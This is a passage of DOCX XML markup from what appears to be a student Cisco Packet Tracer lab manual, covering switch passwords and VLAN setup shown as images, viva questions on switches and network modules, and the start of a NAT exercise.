                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="1726435"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FFA26D3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>CONFIG THE LINE CONSOLE PASSWORD AND ENABLE SECRET PASSWORD:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB04165" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="298D9C50" wp14:editId="38B27125">
            <wp:extent cx="5034486" cy="1390356"/>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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5034486" cy="1390356"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C9AA3D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1194CB64" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="30AB683E" wp14:editId="3ACAD729">
            <wp:extent cx="3648857" cy="1643572"/>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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3648857" cy="1643572"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="144B7E04" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>SHOW THE VLAN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2E2C42" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="12AD020F" wp14:editId="1234BBD7">
            <wp:extent cx="5731509" cy="3319578"/>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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="3319578"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="19649A6C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>NAMING THE VLAN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4384EEC9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0C16D80A" wp14:editId="636A9C32">
            <wp:extent cx="5731510" cy="99016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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="990161"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC96EC8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="13ABDFBA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ASSIGN INTERFACE TO VLAN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B299B8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0BF71C95" wp14:editId="2210419E">
            <wp:extent cx="5420480" cy="142176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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5420480" cy="1421765"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BFF5B2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>ASSIGN IP ADDRESS TO VLAN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20417CF1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="64B21ACB" wp14:editId="1FBADA21">
            <wp:extent cx="5731510" cy="2735637"/>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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2735637"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D32F87" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B62E3C6" w14:textId="14D1EF3A" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC8DB93" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus successfully configured and customize switch with network modules using cisco packet tracer has been verified.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139C7C88" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0488F2A9" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="537B856B" w14:textId="73980BAC" w:rsidR="00812B48" w:rsidRPr="00812B48" w:rsidRDefault="00812B48" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Viva Questions :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7562370F" w14:textId="77F81D4C" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is Cisco Packet Tracer?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E7297E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Cisco Packet Tracer is a network simulation software used to design, configure, and test network topologies virtually.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662FA81A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What is a network module in a switch?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D50EBC6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>A network module is a hardware component that can be added to a switch to provide extra ports or additional functionalities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3471EE36" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Why do we customize switches with network modules?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11CC5AF2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>We customize switches to increase the number of ports, support different network technologies, and meet specific network requirements.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C9BAC5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. What is the function of a switch in a computer network?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410F14FF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>A switch connects multiple devices in a Local Area Network (LAN) and forwards data to the correct destination using MAC addresses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA55705" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. How can you add a network module to a switch in Cisco Packet Tracer?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34085999" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>First, turn off the switch, drag and drop the required module into the empty slot, and then turn the switch back on.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6202F2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="711B02F1" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E17D8E1" w14:textId="2B04C58A" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Ex.No:11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E7F6D8" w14:textId="01E322DB" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="008F6290">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>EXAMINING NETWORK ADDRESS TRANSLATION (NAT) USING</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F5A4C5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="008F6290">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>CISCO PACKET TRACER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EBEED69" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA6B8CD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To Examine Network Address Translation (NAT) using Cisco Packet Tracer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700C5A6D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Setting Up the Network Topology</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F5EC27" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Devices Required:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45973003" w14:textId="4650344B" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2 Routers (R1, R2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C34E5D2" w14:textId="0DF2F41F" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2 Switches (S1, S2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5D1336" w14:textId="3C8BF8B1" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3 PCs (PC1, PC2, PC3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A5213C" w14:textId="60D07750" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1 Server</w:t>
      </w:r>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Serial and Ethernet cables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09716505" w14:textId="30B70770" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Cable the devices:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BF20F3" w14:textId="51538DC9" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>PC1 → FastEthernet0 → Switch S1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E658620" w14:textId="0D7340B3" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>PC2 → FastEthernet0 → Switch S1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09A159CE" w14:textId="1985BCFD" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
